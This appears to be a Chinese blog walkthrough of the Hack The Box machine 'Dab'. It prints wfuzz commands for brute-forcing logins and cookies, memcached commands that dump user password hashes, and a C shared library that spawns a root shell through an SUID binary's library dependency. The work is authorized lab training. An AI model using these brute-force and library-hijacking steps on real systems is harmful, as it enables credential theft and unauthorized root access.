@@ -1,0 +1,243 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/o0Lh8tM3BielhdnDGB6LnQ)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **135** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/x2A34tB6DJ1OkPcdribDzibshJwyiacGV0dL6xyJSMoUODic9LUULgNOnWiciaLpD2A7HtR7e6GqhqAkw8zXBObGceYA/640?wx_fmt=png)
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/150
+
+靶机难度：中级（0.0/10）
+
+靶机发布日期：2019 年 1 月 29 日
+
+靶机描述：
+
+Dab is a challenging machine, that features an interesting enumeration and exploitation path. It teaches techniques and concepts that are useful to know when assessing Web and Linux environments.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/Rhl7Fe1Ew2icdiaxAoicRDTOcic6uZqjKNRuQTmL2KnOQaSBwas6DeYNdq479WEFto9n2bssQXlvVic2bGGlQghxWVg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/6PfJksVUnzcgOBQc60Bzm4BkWoDmLEguQwn8Z4a7QNprDcqKrNNBibNyJgj5oozrKKnicJgkJqQzC2J5GYGCRDxA/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoed4T4RyoF2qf1RrXhRF59YKATnDXicwibNgdiaoxBBeCkuo1RAI9TzGeVw/640?wx_fmt=png)  
+
+可以看到靶机的 IP 是 10.10.10.86..
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeeqAmyh6zia6YGwJapsfLPlsVkgSX7boZW9BgRILNAFKRnhWYwOZeUlg/640?wx_fmt=png)
+
+Nmap 显示 FTP 和 SSH 开放着，Nginx Web 服务器也存在，并在端口 80 和 8080 上运行着...
+
+FTP 匿名访问有个文件，但是没方向，没管了...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoewr27qlQNSlKBic5oEMe3m2T4kroNTlCKBpIQd227TwTVoMicZmbVcVIg/640?wx_fmt=png)
+
+访问 80 页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeJhZPLK8b0jpYMXC68iba9rJ5hJryHFun9tsP5xbw498Nc97HBBFVcsw/640?wx_fmt=png)
+
+利用 burpsuit 拦截分析，使用最常见的凭证 admin:admin 不起作用，拦截可看到 Error: Login failed...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeYicnkn6qibA0ovIgkPtWuDiaSib6JAcCIU89MABOJRavSv6hMicjeFeyJPw/640?wx_fmt=png)
+
+```
+wfuzz -c --hl=18 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=Login' http://10.10.10.86/login
+```
+
+这里利用 wfuzz 进行模糊枚举... 爆破发现了密匙...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoetPudNx60SKmuiazvDydiahaVaShcFkF0psjtsKErC3hbJ6hNNvcN0OZA/640?wx_fmt=png)
+
+进去以后发现一些信息，但是研究了一会没有头绪....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe31TGicKMVC3PwHHLvDgyvQj4k2apVe3r2HcnIlchQcftvsN1wchiaBpA/640?wx_fmt=png)
+
+访问 8080 的 web，发现未填写 cookie 正确的密码，拒绝访问提示...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoetKxMeia93IJ4E2mibhhofcbyn6ebLga8gOkO7WwnyHFNtcr2icCzXu0hQ/640?wx_fmt=png)
+
+继续 bp 分析... 发现了一串 cookie 值，按照提示，是将 cookie 转换成 password？
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeBjMQ10umUTsibqQj6mKJH5g3h3JaAAUxnJhr5PVcTicqTQwEFF3ZyKpw/640?wx_fmt=png)
+
+我尝试按照提示修改下 cookie 为 password，发现了 password authentication cookie incorrec... 只需要获取 cookie 的正确值就可以进入...
+
+继续...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeVHkeJe2iaMibM67ll1wVxF1ReqPs4Tw00p9zHzeZJNkzqaMqwr5kOF4w/640?wx_fmt=png)
+
+```
+wfuzz -u http://10.10.10.86:8080/ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -b password=FUZZ
+```
+
+利用 wfuzz 继续模糊爆破，发现了一大堆 324... 过滤下
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoegcdia7MWQ3tzFldawxz7iaufMDGAOSnC4EaJVAiaLWAoRGylhDAKy1EBg/640?wx_fmt=png)
+
+```
+wfuzz -u http://10.10.10.86:8080/ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -b password=FUZZ --hh 324
+```
+
+过滤后，发现了 password=secret 返回 540 有效...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeEOfE4kTdxu6FmQJDoHTuoP1oicX1NqxwShhJEcnMK200JjsDuaUbrkw/640?wx_fmt=png)
+
+修改后跳转到了该页面... 和 80web 页面类似...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeDgvaFS1VRhEvCEPzYapCScs7AYHMH2Wk1vzIWCVYv02WFAonthcf2g/640?wx_fmt=png)
+
+输入 1 1 后，测试知道这是一个带有提供 TCP 套接字测试的表单网站...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoegvjVgceggkGzibLNYnK0R9Tluu9Qp5ichURQB4aa3rOc76iceAn9lCibKA/640?wx_fmt=png)
+
+测试了 TCP 已开放得端口，返回了错误...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe5yia8zMG5gou6CfI5QuIqbjYtFvtPBWAJgWibXu4eDicL3ugNfs54FH5Q/640?wx_fmt=png)
+
+80 也是 400 错误...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeg9Cickgsu906Zx8xxhBlbhxtvGZsiaTfSzWWbVIghz6ymdZ76NxicBNKg/640?wx_fmt=png)
+
+```
+wfuzz -c -z range,1-65535 -u 'http://10.10.10.86:8080/socket?port=FUZZ&cmd=abc' -H "Cookie: password=secret" --hc=500
+```
+
+继续利用 wfuzz 模糊查找下所有端口...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeNeWwyT9XwCFgdr2xGE84jAibMtGDzNWUO88yQFdibDXP2Nb4ZM2nTU0Q/640?wx_fmt=png)
+
+方便分析，继续利用 bp 拦截，在测试 11211 模糊得到得端口后，发现是有效得... 版本信息获得了
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe8lP5bStICzGt0h6IWbAOEHABVljJQXYvo8T0lfmEsNwWZ0ohKb2Jjg/640?wx_fmt=png)
+
+https://lzone.de/cheat-sheet/memcached
+
+memcached 是一个简单的，高度可扩展的，基于密钥的高速缓存，可在可用或专用 RAM 可供应用程序快速访问的任何位置存储数据和对象，而无需经过解析层或磁盘 I/O...
+
+google 搜索到了类似的文章，发现了表格单...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeC8g1G1piaNrwsA6xRycmaeo5Sk95BnYsPJpQEuWer2XkE4qrk3RrjOw/640?wx_fmt=png)
+
+测试后，发现 stats slabs 输出表单 ID 有 16 和 26...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe8tMvXFSVZ2ibdXxUwGXEpCKaEicsvJ2yAicJleeBfmETRia8soMS7bW7rg/640?wx_fmt=png)
+
+继续检查 stats items 输出表单发现了 16-0 26-0... 意思每个 16-0 和 26-0 组里都有一组数据...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeEpVxkFibpGI7l1gdPTISfVRMmCtxjsMmGYULC03AYscBZC0GiayLskuA/640?wx_fmt=png)
+
+对于每组数据，我利用 stats cachedump 输出 16-0 和 26-0 组表单的信息... 在 26-0 中发现了 26-0 每个组都存在 users 信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeEsu2MtTGotyrFwYeTMloabaePoBApVKUogWUicfsHTKGGzKBTNosibdw/640?wx_fmt=png)
+
+那我利用 get users 输出了所有 26-0 组的 users 信息，发现这些都是用户名 + 密码 hash 值...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe6ibaSU1XJFB0dt8YI0tic8VNJgrVCzfZnWsRxeaz5w9mfZeE95MWxBYQ/640?wx_fmt=png)
+
+把中间一些数值过滤....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeBuJiaAXn0ribiajnDjg0UXOZ8MYMozJPtgWCy00U5yEhO06BZfJnZs9VA/640?wx_fmt=png)
+
+利用 jq 排列... 方便爆破...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeqG1Sb8FyHpRjDbWCyt9CWQic1Wxb80vdnOoiazKt5gUW6Kx7FebDIssw/640?wx_fmt=png)
+
+通过注释掉空格、“”、，等符号后...
+
+利用 john 和 hydra 成功获得了 shh 的用户名和密码...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeZgXvv1HDkJqCVNk91sicIEtK7VicnKyeBhQK6CYUoytcMyOBiamFfDX5A/640?wx_fmt=png)
+
+登录后获得了 user_flag 信息... 和 genevieve 用户权限...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoexPptiae1eVR8Yhic5ExujemYS28PicDQQOGJibiaRicTORu9iaSEsQxgI2MGA/640?wx_fmt=png)
+
+sudo 尝试的提权，让我们继续努力...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoegAArnF9x74V7sYsFe1iao0Kefnh0qicS9E6t65sAeiaAoyZkT2zwuiamlw/640?wx_fmt=png)
+
+LinEnum 枚举靶机信息后，SUID 中 myexec 二进制存在问题...
+
+执行需要输入密码...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeG1Yibfgna4EHQs6db4p09x0kicRficqyzMavncP2Kdlod3x5DbaLdk9ug/640?wx_fmt=png)
+
+将文件传输到本地 kali 进行分析...
+
+利用 IDA 或者 R2 发现了密码？？
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoelxMY1iaA8QSbnHiaicPNVJwHwB38UnYAG5CQBZqmXVekwO9KiaDLic7CgvQ/640?wx_fmt=png)
+
+尝试后成功执行...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeoROibrVQMnPjExlAA01zViaOSbHQyKOPibyhUrjKHfC02l0rktRGzcR6A/640?wx_fmt=png)
+
+利用 ldd 显示出了列表动态依赖的内容... 看到 libseclogin.so
+
+还有输出的内容 seclogin() called
+
+可以替换 libseclogin.so 为另一个文件并链接到它，然后二进制文件将以 root 身份执行... 获得权限
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoedYYDKc6pGKDXNLNmsPkwQiaeWRuvJsicGrnNFEtjXhOFziboagZcfPjpQ/640?wx_fmt=png)
+
+```
+#include <stdio.h>
+
+
+void seclogin() {
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+gcc -fPIC -shared -o libseclogin.so exploit.c
+```
+
+建立 bash 的 shell，进行 gcc 编译... 覆盖 libseclogin.so...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoe8IWiabqmh5gS34jLOuP2PSe8ST6ZCiayxs99yW51foAjOA1xkW9l9pBA/640?wx_fmt=png)
+
+然后要在 / etc/ld.so.conf.d 下创建一个. conf 文件，并把我们的 EXP 文件路径写入...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMRTMU7ISFpoicWsEXzSWhoeHiaTw7bQqWtQWURyH2UBfRo92yLOEpeeicPemoypg9FcZslJBOEicxtRA/640?wx_fmt=png)
+
+利用 ldconfig 调用动态链接... 将 myexec 的 libseclogin.so 调用到 / dev/shm 目录下即可...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/sGWlDp8sFCl67vCmcZr3JtQP0jB8suQiaKaKCVYPOezloiaicS8xMkAriaAQd3dTOPXicBTVStlX66kEffEWJOiczUTA/640?wx_fmt=png)
+
+然后重新执行 myexec 后，或得了 root 权限，并获得了 user_flag 信息....
+
+wfuzz 模糊枚举 --john 和 hydra 爆破 --SUID 二进制文件分析提权
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台高级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/o62ddIpxjBd0kv6p3zb6uf1GiaCo9PiaF12hWQQSurxFPuVIDtsNTgUpjjvmib7GxKXNePVMAwJfzuib52MWoORPYg/640?wx_fmt=png)
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
